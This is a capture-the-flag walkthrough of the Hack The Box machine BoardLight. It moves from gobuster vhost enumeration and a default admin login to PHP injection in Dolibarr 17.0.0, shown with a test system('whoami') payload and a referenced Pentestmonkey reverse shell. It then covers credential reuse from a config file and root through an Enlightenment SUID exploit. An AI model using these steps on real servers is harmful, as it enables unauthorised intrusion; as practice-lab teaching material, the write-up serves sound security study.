---
date: 2025-01-15
categories: [CTF, HTB]
title: ""
tags: ['gobuster', 'nmap', 'privilege escalation', 'rce', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "BoardLight - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - BoardLight

NMAP

![image1](../resources/c584a483f0864c0eb03583194f9d116d.png)

- From the website we get the domain name:

![image2](../resources/14b6dca24a1345e5bdf1e13fa77d9aff.png)

Add board.htb to /etc/hosts

- Subdomain enum:

`gobuster vhost -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64 --append-domain`


![image3](../resources/0ebd3032692f4606bee68d2167100955.png)

We get:

**crm.board.htb**:

- Got a login site:

![image4](../resources/2bace493e6bf4f4eb6d011c15f32677a.png)

Guessed **admin : admin**

- And we're in:

![image5](../resources/4d0b4e9f990a46fc9406753737c3793c.png)

- We can see it runs **Dolibarr 17.0.0**

**<u>RCE exploit:</u>**

On the website tab - we can get RCE
<https://www.swascan.com/security-advisory-dolibarr-17-0-0/>

(The website resets quite often)

- Create new website
- Import website template
(I chose the first template and used the About Us page)
- Edit HTML Source

- I tested with:
\<?php includeContainer('header'); ?\>

\<section id="mysection1" contenteditable="true"\>

```bash
\<?**PHP** echo system("whoami");?\>

```
\</section\>

\<?php includeContainer('footer'); ?\>


![image6](../resources/fdbf7bdebb1648a2b2616aca7689f0df.png)

- Now if we use Pentestmonkey PHP rev shell and paste that inside the boilerplate code:
\<?php includeContainer('header'); ?\>

\<section id="mysection1" contenteditable="true"\>

**\<Pentest Monkey code - Change to Capital PHP\>**

\</section\>

\<?php includeContainer('footer'); ?\>


![image7](../resources/1fa07d7e4e8f40ac92a600ca3eaa0cdc.png)

- Set up listener
- Click save

![image8](../resources/5882ae1f6f5a4443b03e4b82cdcb113f.png)

```bash
/usr/bin/script -qc /bin/bash /dev/null

```
- Upload LinPEAS

We can see port 3306 open - MySQL


![image9](../resources/484b5c2483254a3bb3e9797058197f0a.png)

Also, it found a database.php file:

/var/www/html/crm.board.htb/htdocs/admin/system/database.php


![image10](../resources/1ded344e823e49cd8c1de071f3bc06da.png)

The file itself shows us the variables imported from the conf.php file ie. \$dolibarr_main_db_pass

- The conf file is located in:
/var/www/html/crm.board.htb/htdocs/conf/conf.php


![image11](../resources/f37dc24e41704f149c64592c64d6b649.png)

And here we get MySQL creds

\$dolibarr_main_db_user='**dolibarrowner**';

\$dolibarr_main_db_pass='**serverfun2\$2023!!**';


![image12](../resources/7987608bca534100b188f1bbf75a43fb.png)

```bash
show databases;
use dolibarr;
show tables;

```
There are a lot of tables in the DB

To find which have data do:

```bash
SELECT TABLE_NAME,TABLE_ROWS FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'dolibarr';

```

![image13](../resources/0bdac24f00f146cd9b7d6f450fedea2b.png)


![image14](../resources/f0cd93d40d4a42cfa74a6d846d8a0758.png)

- After messing around with trying to crack the hash - which is a dead end and not needed:

I reused the mysql user password for larissa.

```bash
su larissa

# serverfun2\$2023!!
```

![image15](../resources/a6de4baf5e264e299fb613e990805b06.png)

- We can now SSH in

![image16](../resources/93cc749938ad404983752f4386230aea.png)

```bash
cat user.txt

```
**<u>Priv Esc</u>**

- In LinPEAS (updated version) - we see the unknown SUID binaries - enlightenment:

![image17](../resources/de2f56d2bcdc4483b51ff7ec52b00994.png)

- There is an exploit for this:
<https://www.exploit-db.com/exploits/51180>

- Run the bash script:

![image18](../resources/b9c6bf178c7643898908e1cce9a8f461.png)

- Root:

![image19](../resources/afb75ccbe05648fb914a5c94418df6f5.png)